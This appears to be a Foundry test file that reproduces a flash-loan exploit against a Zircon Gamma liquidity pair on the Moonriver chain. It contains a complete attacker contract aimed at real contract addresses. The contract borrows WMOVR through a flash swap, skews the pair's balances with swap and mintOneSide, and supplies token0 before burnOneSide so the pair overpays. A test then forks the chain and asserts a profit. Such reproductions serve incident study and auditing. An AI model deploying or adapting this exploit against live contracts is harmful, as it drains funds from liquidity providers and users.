// SPDX-License-Identifier: UNLICENSED
pragma solidity ^0.8.15;

import "forge-std/Test.sol";

interface IERC20Zircon {
    function balanceOf(
        address account
    ) external view returns (uint256);
    function transfer(
        address recipient,
        uint256 amount
    ) external returns (bool);
}

interface IZirconPairExploit is IERC20Zircon {
    function mintOneSide(
        address to,
        bool isReserve0
    ) external returns (uint256 liquidity, uint256 amount0, uint256 amount1);
    function burnOneSide(
        address to,
        bool isReserve0
    ) external returns (uint256 amount);
    function swap(
        uint256 amount0Out,
        uint256 amount1Out,
        address to,
        bytes calldata data
    ) external;
}

interface IUniswapV2PairZircon {
    function swap(
        uint256 amount0Out,
        uint256 amount1Out,
        address to,
        bytes calldata data
    ) external;
}

contract ZirconGammaAttacker {
    IERC20Zircon private constant WMOVR = IERC20Zircon(0x98878B06940aE243284CA214f92Bb71a2b032B8A);
    IERC20Zircon private constant TOKEN0 = IERC20Zircon(0x6Ccf12B480A99C54b23647c995f4525D544A7E72);
    IZirconPairExploit private constant ZIRCON_PAIR = IZirconPairExploit(0xDea4E4C9E55bB3720D1944E9465FD87A1a704261);
    IUniswapV2PairZircon private constant FLASH_PAIR = IUniswapV2PairZircon(0xe537f70a8b62204832B8Ba91940B77d3f79AEb81);

    uint256 private constant FLASH_AMOUNT = 2500 ether;
    uint256 private constant SWAP_IN = 384_422_424_857_219_163_972;
    uint256 private constant SWAP_OUT = 581_741_050_640_521_145_417;
    uint256 private constant ONE_SIDE_AMOUNT = 1800 ether;
    uint256 private constant TOKEN0_TO_BURN = 519_572_267_891_626_753_435;

    function attack() external {
        FLASH_PAIR.swap(FLASH_AMOUNT, 0, address(this), abi.encode(ONE_SIDE_AMOUNT));
    }

    function uniswapV2Call(
        address,
        uint256 amount0,
        uint256,
        bytes calldata data
    ) external {
        require(msg.sender == address(FLASH_PAIR), "not flash pair");

        uint256 oneSideAmount = abi.decode(data, (uint256));
        WMOVR.transfer(address(ZIRCON_PAIR), SWAP_IN);
        ZIRCON_PAIR.swap(SWAP_OUT, 0, address(this), "");

        WMOVR.transfer(address(ZIRCON_PAIR), oneSideAmount);
        ZIRCON_PAIR.mintOneSide(address(this), false);

        // Supplying the previously swapped token before burnOneSide makes the
        // pair overpay WMOVR because it prices the burn from manipulated balances.
        TOKEN0.transfer(address(ZIRCON_PAIR), TOKEN0_TO_BURN);
        ZIRCON_PAIR.transfer(address(ZIRCON_PAIR), ZIRCON_PAIR.balanceOf(address(this)));
        ZIRCON_PAIR.burnOneSide(address(this), false);

        WMOVR.transfer(address(FLASH_PAIR), amount0 * 10_000 / 9974 + 1);
    }
}

contract ZirconGammaExploitTest is Test {
    IERC20Zircon private constant WMOVR = IERC20Zircon(0x98878B06940aE243284CA214f92Bb71a2b032B8A);

    function testExploit() public {
        vm.createSelectFork("https://rpc.api.moonriver.moonbeam.network", 3_845_597);

        ZirconGammaAttacker attacker = new ZirconGammaAttacker();
        attacker.attack();

        assertGt(WMOVR.balanceOf(address(attacker)), 0);
    }
}
